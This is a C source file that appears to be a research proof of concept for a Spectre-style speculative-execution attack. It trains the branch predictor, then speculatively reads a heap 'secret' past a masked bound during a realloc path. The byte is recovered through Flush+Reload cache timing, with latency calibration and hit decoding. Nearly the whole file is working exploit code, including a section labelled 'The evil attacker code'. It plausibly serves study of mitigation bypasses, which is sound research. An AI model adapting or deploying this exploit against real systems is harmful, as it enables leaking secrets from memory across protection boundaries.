#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "nospec.h"
#include <string.h>
#include <stdbool.h>
#include "inline_asm.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <errno.h>
#include <sys/resource.h>


#define PAGE_SIZE 4096
#define NUM_PAGES 256

static inline unsigned long
array_index_mask_nospec(unsigned long index, unsigned long size) {
    unsigned long mask;

    asm volatile("cmp %1,%2; sbb %0,%0;"
                 : "=r"(mask)
                 : "g"(size), "r"(index)
                 : "cc");
    return mask;
}


volatile uint32_t array_size = 8;


void set_heap_limit(size_t limit_bytes) {
    struct rlimit rl;
    rl.rlim_cur = limit_bytes;
    rl.rlim_max = limit_bytes;

    if (setrlimit(RLIMIT_AS, &rl) != 0) {
        perror("setrlimit failed");
        exit(1);
    }
}

char* secret_init(){
    char* array = malloc(array_size);
    if (array == NULL) {
        perror("Initial malloc failed");
        return NULL;
    }
    array[0] = 'A';
    printf("Secret addr: %p\n", array);
    return array;
}

uint8_t* array_init(){
    uint8_t* array = malloc(array_size);
    if (array == NULL) {
        perror("Initial malloc failed");
        return NULL;
    }
    memset(array, '-', array_size);
    printf("Array addr: %p\n", array);
    return array;
}

uint8_t* otherArray_init(uint32_t size, uint32_t malicious_index, char known_value){
    uint8_t* array = malloc(size * sizeof(uint8_t));
    if (array == NULL) {
        perror("Initial malloc failed");
        return NULL;
    }
    memset(array, '-', size);
    array[malicious_index] = known_value;
    printf("Other Array addr: %p\n", array);
    return array;
}

char random_char(){
    return 'Z';
    // return (char)(rand() % 93 + 33);
}




#define REP 100 // Number of repetitions to de-noise the channel
#define TRAINING_EPOCH 32 // 15 in-bound accesses then 1 out-of-bound access
#define BUF_SIZE 1


#define CACHE_LINE_SIZE 64
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
}

void flush_lines(void *start, size_t stride, size_t N) {
    for (size_t c = 0; c < N; c++) {
        _mm_clflush(start + stride * c);
    }
}

void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';
    for (size_t i = 1; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;

            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}

// ====== The evil attacker code ======


uint64_t calibrate_latency() {
    uint64_t hit = 0, miss = 0, threshold, rep = 1000;
    uint8_t *data = malloc(8);
    assert(data); // Lazy "exception" handling

    // Measure cache hit latency
    _maccess(data);
    for (uint32_t n = 0; n < rep; n++) {
        uint64_t start = _timer_start();
        _maccess(data);
        hit += _timer_end() - start;
    }
    hit /= rep;

    // Measure cache miss latency
    for (uint32_t n = 0; n < rep; n++) {
        _mm_clflush(data);
        uint64_t start = _timer_start();
        _maccess(data);
        miss += _timer_end() - start;
    }
    miss /= rep;

    threshold = ((2 * miss) + hit) / 3;
    printf("Avg. hit latency: %" PRIu64 ", Avg. miss latency: %" PRIu64
           ", Threshold: %" PRIu64 "\n",
           hit, miss, threshold);
    free(data);
    return threshold;
}

uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
    if (new_size < array_size / 2 || new_size > array_size) {
        uint8_t *old_array = *array;
        *array = realloc(*array, new_size);
        memcpy(*array, old_array, array_size); // move the old content
    }
    index &= array_index_mask_nospec(index, new_size);
    uint8_t secret = (*array)[index];
    _maccess(page + secret * stride);

    return NULL;
}


void attacker_function() {
    // Create read-only shared pages for Flush+Reload
    // SYMBOL_CNT=256
    uint8_t *array = array_init();
    char *secret = secret_init();
    printf("Offset: %#lx\n", (uintptr_t)secret - (uintptr_t)array);

    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);


    uint64_t threshold = calibrate_latency();
    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    uint8_t* array_base = &array[0]; // Base address
    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
    printf("Secret address: %p, Array address: %p\n", secret, array_base);
    printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
           malicious_index);
    printf("-----------------------------------------\n");
    array_base = &array[0];
    // printf("attacker: array base addr: %p, secret addr: %p\n", array_base, secret);
    //malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
    size_t safe_size = array_size-1; //New size but not too small to actually want to resize
    size_t safe_index = array_size/2; //An in-bound index
    size_t malicious_size = (size_t)(malicious_index+1);

    uint8_t* otherArray = otherArray_init(malicious_size, malicious_index, 'Z');
    char known_value = random_char();
    // printf("Other Array addr: %p\n", otherArray);

    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
        for (size_t r = 0; r < REP; r++) {
            for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                // We use an in-bound index for the first TRAINING_EPOCH - 1
                // iterations and switch to the malicious index
                // for the last iteration
                bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
                size_t size = csel(malicious_size, safe_size, is_attack);
                size_t index = csel(malicious_index, safe_index, is_attack);


                // The "Flush" part of Flush+Reload
                // Can be replaced with Prime+Probe
                // startIndex, stride, N
                flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);
                _mm_clflush((void *)&array_size);
                if (is_attack) {
                    free(otherArray);
                }
                // Ensure clflushes are finished
                _mm_mfence();
                _mm_lfence();
                // Call the victim function and prevent compiler optimizations
                _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                // A clever hack to traverse [0, 255] in an unpredictable order
                // to confuse the prefetcher
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;

                // The "Reload" part of Flush+Reload
                // Can be replaced with Prime+Probe
                uint8_t *ptr = pages + PAGE_SIZE * idx;
                if (idx != (uint8_t)known_value) {
                    hits[idx] += (_time_maccess(ptr) <= threshold);
                }
            }
            // Trick: array_init will reuse the old array location due to memory allocator's locality optimization
            // printf("Reallocated array pointer: %p\n", array);
            free(array);
            array = array_init();
            known_value = random_char();
            otherArray = otherArray_init(malicious_size, malicious_index, known_value);
            // printf("Incorrect Other Access %c\n", otherArray[malicious_index]);
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits)); // Reset hit counts
    }
    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    free(array);
    free(secret);
    return;
}


int main (){
    set_heap_limit(100 * 1024 * 1024);
    attacker_function();
    return 0;
}
